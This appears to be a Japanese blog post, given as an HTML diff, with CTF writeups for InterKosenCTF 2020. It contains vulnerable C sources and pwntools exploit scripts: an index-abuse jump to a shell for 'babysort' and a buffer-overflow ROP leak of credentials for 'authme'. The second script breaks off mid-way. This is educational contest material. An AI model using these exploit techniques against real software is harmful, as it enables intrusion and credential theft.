@@ -1,0 +1,1293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>InterKosenCTF2020 - みつみつみつですか？</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="mitsu" /><meta name="description" content="InterKosenCTF 2020に，久しぶりにkaitoさんとチームStarrySkyで参加しました．結果は20位で少し残念でしたが，面白い問題が多くとても楽しめ" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.74.3 with theme even" />
+
+
+<link rel="canonical" href="https://mitsu1119.github.io/blog/post/post3/interkosenctf2020/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/blog/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/blog/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/blog/favicon-16x16.png">
+<link rel="manifest" href="/blog/manifest.json">
+<link rel="mask-icon" href="/blog/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/blog/sass/main.min.651e6917abb0239242daa570c2bec9867267bbcd83646da5a850afe573347b44.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="InterKosenCTF2020" />
+<meta property="og:description" content="InterKosenCTF 2020に，久しぶりにkaitoさんとチームStarrySkyで参加しました．結果は20位で少し残念でしたが，面白い問題が多くとても楽しめ" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mitsu1119.github.io/blog/post/post3/interkosenctf2020/" />
+<meta property="article:published_time" content="2020-09-07T01:14:23+09:00" />
+<meta property="article:modified_time" content="2020-09-07T01:14:23+09:00" />
+<meta itemprop="name" content="InterKosenCTF2020">
+<meta itemprop="description" content="InterKosenCTF 2020に，久しぶりにkaitoさんとチームStarrySkyで参加しました．結果は20位で少し残念でしたが，面白い問題が多くとても楽しめ">
+<meta itemprop="datePublished" content="2020-09-07T01:14:23+09:00" />
+<meta itemprop="dateModified" content="2020-09-07T01:14:23+09:00" />
+<meta itemprop="wordCount" content="4977">
+
+
+
+<meta itemprop="keywords" content="writeup,kosen," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="InterKosenCTF2020"/>
+<meta name="twitter:description" content="InterKosenCTF 2020に，久しぶりにkaitoさんとチームStarrySkyで参加しました．結果は20位で少し残念でしたが，面白い問題が多くとても楽しめ"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/blog/" class="logo">みつみつみつですか？</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/blog/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/blog/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/blog/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/blog/" class="logo">みつみつみつですか？</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/blog/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/blog/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/blog/tags/">Tags</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">InterKosenCTF2020</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2020-09-07 </span>
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwn-105pts-babysort-49-solved">[pwn: 105pts] babysort (49 solved)</a></li>
+    <li><a href="#pwn-300pts-authme-20-solved">[pwn: 300pts] authme (20 solved)</a></li>
+    <li><a href="#crypto-201pts-ciphertexts-33-solved">[crypto: 201pts] ciphertexts (33 solved)</a></li>
+    <li><a href="#crypto-326pts-bitcrypto-17-solved">[crypto: 326pts] bitcrypto (17 solved)</a></li>
+    <li><a href="#crypto-383pts-ochazuke-11-solved">[crypto: 383pts] ochazuke (11 solved)</a></li>
+    <li><a href="#reversing-182pts-harmagedon-36-solved">[reversing: 182pts] harmagedon (36 solved)</a></li>
+    <li><a href="#reversing-182pts-in-question-36-solved">[reversing: 182pts] in question (36 solved)</a></li>
+    <li><a href="#reversing-252pts-trilemma-26-solved">[reversing: 252pts] trilemma (26 solved)</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <div class="section">
+<p>InterKosenCTF 2020に，久しぶりにkaitoさんとチームStarrySkyで参加しました．結果は20位で少し残念でしたが，面白い問題が多くとても楽しめました．運営は3人しかいないらしくとても大変そうです．本当にお疲れ様でした．<br>
+では自分が解いた問題のwirteupを書いていこうと思います．</p>
+<br>
+<h1 id="pwn-105pts-babysort-49-solved">[pwn: 105pts] babysort (49 solved)</h1>
+<p>次のプログラムで動いているサービスがあります．</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="k">typedef</span> <span class="nf">int</span> <span class="p">(</span><span class="o">*</span><span class="n">SORTFUNC</span><span class="p">)(</span><span class="k">const</span> <span class="kt">void</span><span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span><span class="o">*</span><span class="p">);</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+  <span class="kt">long</span> <span class="n">elm</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
+  <span class="n">SORTFUNC</span> <span class="n">cmp</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+<span class="p">}</span> <span class="n">SortExperiment</span><span class="p">;</span>
+
+<span class="cm">/* call me! */</span>
+<span class="kt">void</span> <span class="nf">win</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+  <span class="n">execve</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">args</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">cmp_asc</span><span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">b</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="n">a</span> <span class="o">-</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="n">b</span><span class="p">;</span> <span class="p">}</span>
+<span class="kt">int</span> <span class="nf">cmp_dsc</span><span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">b</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="n">b</span> <span class="o">-</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="n">a</span><span class="p">;</span> <span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">SortExperiment</span> <span class="n">se</span> <span class="o">=</span> <span class="p">{.</span><span class="n">cmp</span> <span class="o">=</span> <span class="p">{</span><span class="n">cmp_asc</span><span class="p">,</span> <span class="n">cmp_dsc</span><span class="p">}};</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+
+  <span class="cm">/* input numbers */</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;-*-*- Sort Experiment -*-*-&#34;</span><span class="p">);</span>
+  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;elm[%d] = &#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">se</span><span class="p">.</span><span class="n">elm</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="cm">/* sort */</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[0] Ascending / [1] Descending: &#34;</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">i</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="n">qsort</span><span class="p">(</span><span class="n">se</span><span class="p">.</span><span class="n">elm</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">),</span> <span class="n">se</span><span class="p">.</span><span class="n">cmp</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+
+  <span class="cm">/* output result */</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Result:&#34;</span><span class="p">);</span>
+  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;elm[%d] = %ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">se</span><span class="p">.</span><span class="n">elm</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span>
+<span class="kt">void</span> <span class="n">setup</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">alarm</span><span class="p">(</span><span class="mi">300</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>bofかなんかを利用してwin関数に飛べばフラグが取れる問題です．34行目にあるscanfで，負の数値を受け取ることができてしまうことを利用して，qsortのソート用の関数をwinのアドレスにすることで呼び出すことができます．</p>
+<p>構造体はそのメンバ順にメモリにマップされるため，se.cmpの一つ後ろのアドレスにse.elmの一番後ろのアドレスが位置しています．そのため，最初の入力でse.elmの一番最後の要素にwinのアドレスを入れておけば，se.cmp[-1]をqsortに渡すことでwinを呼び出すことができます．<br>
+ソルバどぺー</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">win_addr</span> <span class="o">=</span> <span class="mh">0x00400787</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.kosenctf.com&#34;</span><span class="p">,</span> <span class="mi">9001</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;0&#34;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;0&#34;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;0&#34;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;0&#34;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">win_addr</span><span class="p">))</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;-1&#34;</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="c1"># KosenCTF{f4k3_p01nt3r_l34ds_u_2_w1n}</span>
+</code></pre></td></tr></table>
+</div>
+</div><br>
+<h1 id="pwn-300pts-authme-20-solved">[pwn: 300pts] authme (20 solved)</h1>
+<p>次のコードで動いている実行ファイルと，ダミーのパスワードとユーザー名が渡されます．</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="n">auth</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
+<span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
+
+<span class="kt">void</span> <span class="nf">init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+
+  <span class="cm">/* read secret username */</span>
+  <span class="k">if</span> <span class="p">((</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;./username&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Please report this bug to the admin&#34;</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">fread</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+  <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+
+  <span class="cm">/* read secret password */</span>
+  <span class="k">if</span> <span class="p">((</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;./password&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Please report this bug to the admin&#34;</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">fread</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+  <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
+
+  <span class="n">init</span><span class="p">();</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;                _   _     __  __ ______ &#34;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;     /</span><span class="se">\\</span><span class="s">        | | | |   |  </span><span class="se">\\</span><span class="s">/  |  ____|&#34;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;    /  </span><span class="se">\\</span><span class="s">  _   _| |_| |__ | </span><span class="se">\\</span><span class="s">  / | |__   &#34;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;   / /</span><span class="se">\\</span><span class="s"> </span><span class="se">\\</span><span class="s">| | | | __| &#39;_ </span><span class="se">\\</span><span class="s">| |</span><span class="se">\\</span><span class="s">/| |  __|  &#34;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;  / ____ </span><span class="se">\\</span><span class="s"> |_| | |_| | | | |  | | |____ &#34;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34; /_/    </span><span class="se">\\</span><span class="s">_</span><span class="se">\\</span><span class="s">__,_|</span><span class="se">\\</span><span class="s">__|_| |_|_|  |_|______|</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Username: &#34;</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">auth</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Password: &#34;</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="n">auth</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">auth</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+] OK!&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] NG!&#34;</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span>
+<span class="kt">void</span> <span class="n">setup</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">alarm</span><span class="p">(</span><span class="mi">60</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>bufの容量が0x20なのにもかかわらず，43，47行目で0x40の長さの文字列が入力できてしまうのが脆弱性になっています．最初はこれに気づけなくて大変でした．</p>
+<p>一つ目のfgetsでbofを起こせます．bufの先頭からオフセット0x28の位置にリターンアドレスがあり，この部分でそれをを書き換えることができます．また，そのまま進むとauthが1でも0でもexitしてしまうためリターンアドレスに飛ぶことファできないため，2つ目のfgetsにnullを返させてreturn 1を実行できるようにします．</p>
+<p>1つ目のfgetsで，リターンアドレスを52行目のsystemに飛ばせばそのままシェルが取れるような気がしますが，実はこの部分のアドレスには0x0aが含まれています．これは改行文字でfgetsはそこで入力を終わりにしてしまい，52行目のアドレスを入力しきることができません．そのためpop rdiのガジェットを使ってusernameとpasswordをputsしリークすることを目指します．<br>
+ソルバどぺー<br>
+10行目のコメントを外せばパスワードが取れます．</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.kosenctf.com&#34;</span><span class="p">,</span> <span class="mi">9002</span><span class="p">)</span>
+
+<span class="n">puts</span> <span class="o">=</span> <span class="mh">0x4006a6</span>
+<span class="n">username</span> <span class="o">=</span> <span class="mh">0x6020c0</span>
+<span class="n">password</span> <span class="o">=</span> <span class="mh">0x6020e0</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400b03</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mh">0x28</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="c1"># payload = b&#34;A&#34; * 0x28 + p64(pop_rdi) + p64(password) + p64(puts)[:-1]</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
